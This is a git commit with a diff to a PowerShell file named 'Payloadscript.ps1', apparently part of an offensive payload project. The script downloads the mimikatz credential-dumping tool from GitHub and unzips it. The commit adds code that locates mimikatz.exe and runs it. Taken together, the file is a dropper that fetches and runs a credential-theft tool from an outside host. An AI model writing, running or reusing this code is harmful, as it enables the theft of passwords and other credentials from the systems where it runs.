ee47204c5c68d4112d4520790bc6288d53cf1bd8
GHXSTFPS <4892tylerp@gmail.com>
2025-12-09 17:59:33 -0500

    script now opens mimikatz

--- V1/Payloadscript.ps1
+++ V1/Payloadscript.ps1
@@ -12,9 +12,20 @@ try{
 Invoke-WebRequest "https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip" -OutFile "katz.zip"
 $zipPath = Join-Path $PSScriptRoot "katz.zip"
 $destPath = Join-Path $PSScriptRoot "katz"
-Expand-Archive $zipPath -DestinationPath $destPath
+Expand-Archive $zipPath -DestinationPath $destPath -Force
 Remove-Item $zipPath
 }
 catch {
         Write-Host "Error Downloading mimikatz $_" -ForegroundColor Red
         }
+
+$destPath = Join-Path $PSScriptRoot "katz"
+$mimikatz = Get-ChildItem -Path $destPath -Filter "mimikatz.exe" -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 1
+
+# Check if we found it
+if ($null -eq $mimikatz) {
+    Write-Error "Executable not found!"
+} else {
+    Write-Host "Found executable at $($mimikatz.FullName)"
+}
+& $mimikatz.FullName 
